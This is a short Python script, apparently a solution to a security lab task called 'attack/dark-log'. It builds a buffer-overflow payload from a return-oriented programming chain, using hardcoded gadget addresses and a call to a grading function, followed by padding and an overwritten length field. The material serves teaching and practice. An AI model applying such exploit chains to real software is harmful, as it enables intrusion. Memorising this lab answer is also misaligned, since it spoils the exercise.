#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

payload = b""

POP_RDI = 0x4018A3       
RET = 0x4018A4           
GRADE_EVAL = 0x401677    

LEN_OFFSET = 0x100       
LEN_VALUE = 0xA8         

chain = b""
chain += struct.pack("<Q", POP_RDI)
chain += struct.pack("<Q", 4)                   
chain += struct.pack("<Q", RET)                 
chain += struct.pack("<Q", GRADE_EVAL)
chain += struct.pack("<Q", 0)                   
chain = chain.ljust(128, b"\x00")

payload = bytearray(chain)                      
payload += b"B" * (LEN_OFFSET - len(payload))   
payload += struct.pack("<I", LEN_VALUE)

sys.stdout.buffer.write(payload)